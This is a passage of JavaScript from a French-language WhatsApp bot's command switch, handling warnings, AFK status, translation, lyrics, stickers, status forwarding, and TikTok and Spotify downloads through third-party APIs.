          if (target) { if (s.warns[jid]) delete s.warns[jid][target]; }
          else { s.warns[jid] = {}; }
        });
        await reply(`✅ Warns reset${target ? ` pour @${target.split('@')[0]}` : ''}.`);
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // AFK
      // ═════════════════════════════════════════════════════════════════════
      case 'afk': {
        updateState(s => { s.afks[senderJid] = { reason: arg || 'pas de raison', since: Date.now() }; });
        await reply(`💤 @${senderNum} est maintenant AFK : *${arg || 'pas de raison'}*`);
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // UTILS — translate / lyrics / removebg / upscale / savestatus / sticker
      // ═════════════════════════════════════════════════════════════════════
      case 'translate': case 'trans': {
        const m = arg.match(/^([a-z]{2})\s+(.+)/i);
        if (!m) { await reply(`❌ Usage: *${PREFIX}translate <lang> <texte>* (ex: fr Hello)`); break; }
        const [, lang, txt] = m;
        const d = await tryFetch([`https://api.popcat.xyz/translate?to=${lang}&text=${encodeURIComponent(txt)}`]);
        await reply(d?.translated ? `🌐 (${lang}) ${d.translated}` : '❌ Échec.');
        break;
      }
      case 'lyrics': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}lyrics <titre>*`); break; }
        const d = await tryFetch([`https://api.popcat.xyz/lyrics?song=${encodeURIComponent(arg)}`]);
        if (!d?.lyrics) { await reply('❌ Pas trouvé.'); break; }
        await reply(`🎵 *${d.title}* — ${d.artist}\n\n${String(d.lyrics).slice(0, 3500)}`);
        break;
      }
      case 'removebg': {
        const q = quotedMsg(msg);
        if (!q?.quoted?.imageMessage) { await reply('❌ Réponds à une image.'); break; }
        await reply('⏳ Removing background…');
        await reply('⚠️ removebg nécessite une clé API (remove.bg). Ajoute REMOVE_BG_KEY puis active le pipeline upload.');
        break;
      }
      case 'upscale': {
        const q = quotedMsg(msg);
        if (!q?.quoted?.imageMessage) { await reply('❌ Réponds à une image.'); break; }
        await reply('🔍 Upscale en cours — endpoint upscale activé une fois l\'upload media branché.');
        break;
      }
      case 'savestatus': {
        const q = quotedMsg(msg);
        if (!q?.quoted) { await reply('❌ Réponds à un statut.'); break; }
        try {
          await natsu.sendMessage(jid, { forward: { key: { remoteJid: 'status@broadcast', participant: q.participant }, message: q.quoted } }, { quoted: msg });
        } catch (e) { await reply(`❌ ${e.message}`); }
        break;
      }
      case 'sticker': case 'stiker': {
        const q = quotedMsg(msg);
        const im = q?.quoted?.imageMessage;
        if (!im) { await reply('❌ Réponds à une image avec *.sticker*.'); break; }
        try {
          const { downloadMediaMessage } = await import('baileys');
          const buf = await downloadMediaMessage({ message: { imageMessage: im } }, 'buffer', {});
          await natsu.sendMessage(jid, { sticker: buf }, { quoted: msg });
        } catch (e) { await reply(`❌ Sticker: ${e.message} (nécessite ffmpeg/sharp).`); }
        break;
      }

      // ═════════════════════════════════════════════════════════════════════
      // DOWNLOADER additions
      // ═════════════════════════════════════════════════════════════════════
      case 'tiktok': case 'tt': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}tiktok <url>*`); break; }
        await reply('⏳ TikTok…');
        const d = await tryFetch([
          `https://api.giftedtech.web.id/api/download/tiktokdl?apikey=gifted&url=${encodeURIComponent(arg)}`,
          `https://api.dreaded.site/api/tiktok?url=${encodeURIComponent(arg)}`,
          `https://api.bk9.dev/download/tiktok?url=${encodeURIComponent(text)}`,
        ]);
        const r = d?.result || d?.tiktok || d;
        const url = r?.video || r?.no_watermark || r?.download_url || r?.url;
        if (!url) { await reply('❌ Échec.'); break; }
        try { await natsu.sendMessage(jid, { video: { url }, caption: `🎵 ${r?.title || 'TikTok'}`, contextInfo: forwardedContext() }, { quoted: msg }); }
        catch { await reply(`🔗 ${url}`); }
        break;
      }
      case 'spotify': {
        if (!arg) { await reply(`❌ Usage: *${PREFIX}spotify <titre ou url>*`); break; }
        const d = await tryFetch([`https://api.giftedtech.web.id/api/download/spotifydl?apikey=gifted&url=${encodeURIComponent(arg)}`,
                                  `https://api.giftedtech.web.id/api/search/spotify?apikey=gifted&query=${encodeURIComponent(arg)}`]);
        const r = d?.result || d;
        const url = r?.download_url || r?.audio || r?.url || r?.[0]?.url;
        if (!url) { await reply('❌ Échec Spotify.'); break; }
        try { await natsu.sendMessage(jid, { audio: { url }, mimetype: 'audio/mpeg', contextInfo: forwardedContext() }, { quoted: msg }); }
        catch { await reply(`🔗 ${url}`); }
        break;
      }

      // ─────────────────────────────────────────────────────────────────────
      default:
        // silent — unknown command
        break;
    }
  } catch (err) {
    console.error(`[cmd ${cmd}]`, err?.message || err);
    try { await reply(`❌ Error: ${err.message || 'unknown'}`); } catch {}
  }
}
